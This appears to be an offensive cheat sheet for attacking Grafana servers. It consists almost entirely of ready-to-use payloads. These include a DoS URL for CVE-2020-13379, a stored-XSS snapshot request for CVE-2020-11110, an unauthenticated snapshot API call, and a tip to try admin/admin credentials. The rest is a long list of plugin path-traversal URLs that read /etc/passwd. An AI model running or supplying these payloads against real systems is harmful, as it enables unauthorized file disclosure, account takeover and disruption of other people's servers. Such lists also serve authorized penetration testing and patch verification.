# Grafana
1. CVE-2020-13379 (Denial of Service)
```
<GRAFANA URL>/avatar/%7B%7Bprintf%20%22%25s%22%20%22this.Url%22%7D%7D
```
2. CVE-2020-11110 (Stored XSS)
```
POST /api/snapshots HTTP/1.1
Host: <GRAFANA URL>
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Referer: {{BaseURL}}
content-type: application/json
Connection: close

{"dashboard":{"annotations":{"list":[{"name":"Annotations & Alerts","enable":true,"iconColor":"rgba(0, 211, 255, 1)","type":"dashboard","builtIn":1,"hide":true}]},"editable":true,"gnetId":null,"graphTooltip":0,"id":null,"links":[],"panels":[],"schemaVersion":18,"snapshot":{"originalUrl":"javascript:alert('Revers3c')","timestamp":"2020-03-30T01:24:44.529Z"},"style":"dark","tags":[],"templating":{"list":[]},"time":{"from":null,"to":"2020-03-30T01:24:53.549Z","raw":{"from":"6h","to":"now"}},"timepicker":{"refresh_intervals":["5s","10s","30s","1m","5m","15m","30m","1h","2h","1d"],"time_options":["5m","15m","1h","6h","12h","24h","2d","7d","30d"]},"timezone":"","title":"Dashboard","uid":null,"version":0},"name":"Dashboard","expires":0}
```
3. CVE-2019-15043 (Grafana Unauthenticated API)
```
POST /api/snapshots HTTP/1.1
Host: <GRAFANA URL>
Connection: close
Content-Length: 235
Accept: */*
Accept-Language: en
Content-Type: application/json

{"dashboard":{"editable":false,"hideControls":true,"nav":[{"enable":false,"type":"timepicker"}],"rows": [{}],"style":"dark","tags":[],"templating":{"list":[]},"time":{},"timezone":"browser","title":"Home","version":5},"expires": 3600}
```
4. Default Credentials
```
Try to login using admin as username and password
```
5. Signup Enabled
```
<GRAFANA URL>/signup
```



/public/plugins/alertmanager/../../../../../../../../etc/passwd
/public/plugins/cloudwatch/../../../../../../../../etc/passwd
/public/plugins/dashboard/../../../../../../../../etc/passwd
/public/plugins/elasticsearch/../../../../../../../../etc/passwd
/public/plugins/grafana/../../../../../../../../etc/passwd
/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../etc/passwd
/public/plugins/graphite/../../../../../../../../etc/passwd
/public/plugins/influxdb/../../../../../../../../etc/passwd
/public/plugins/jaeger/../../../../../../../../etc/passwd
/public/plugins/loki/../../../../../../../../etc/passwd
/public/plugins/mixed/../../../../../../../../etc/passwd
/public/plugins/mssql/../../../../../../../../etc/passwd
/public/plugins/mysql/../../../../../../../../etc/passwd
/public/plugins/opentsdb/../../../../../../../../etc/passwd
/public/plugins/postgres/../../../../../../../../etc/passwd
/public/plugins/prometheus/../../../../../../../../etc/passwd
/public/plugins/tempo/../../../../../../../../etc/passwd
/public/plugins/testdata/../../../../../../../../etc/passwd
/public/plugins/zipkin/../../../../../../../../etc/passwd
/public/plugins/alertGroups/../../../../../../../../etc/passwd
/public/plugins/alertlist/../../../../../../../../etc/passwd
/public/plugins/annolist/../../../../../../../../etc/passwd
/public/plugins/barchart/../../../../../../../../etc/passwd
/public/plugins/bargauge/../../../../../../../../etc/passwd
/public/plugins/canvas/../../../../../../../../etc/passwd
/public/plugins/dashlist/../../../../../../../../etc/passwd
/public/plugins/debug/../../../../../../../../etc/passwd
/public/plugins/gauge/../../../../../../../../etc/passwd
/public/plugins/geomap/../../../../../../../../etc/passwd
/public/plugins/gettingstarted/../../../../../../../../etc/passwd
/public/plugins/graph/../../../../../../../../etc/passwd
/public/plugins/heatmap/../../../../../../../../etc/passwd
/public/plugins/histogram/../../../../../../../../etc/passwd
/public/plugins/live/../../../../../../../../etc/passwd
/public/plugins/logs/../../../../../../../../etc/passwd
/public/plugins/news/../../../../../../../../etc/passwd
/public/plugins/nodeGraph/../../../../../../../../etc/passwd
/public/plugins/piechart/../../../../../../../../etc/passwd
/public/plugins/pluginlist/../../../../../../../../etc/passwd
/public/plugins/stat/../../../../../../../../etc/passwd
/public/plugins/state-timeline/../../../../../../../../etc/passwd
/public/plugins/status-history/../../../../../../../../etc/passwd
/public/plugins/table/../../../../../../../../etc/passwd
/public/plugins/table-old/../../../../../../../../etc/passwd
/public/plugins/text/../../../../../../../../etc/passwd
/public/plugins/timeseries/../../../../../../../../etc/passwd
/public/plugins/welcome/../../../../../../../../etc/passwd
/public/plugins/xychart/../../../../../../../../etc/passwd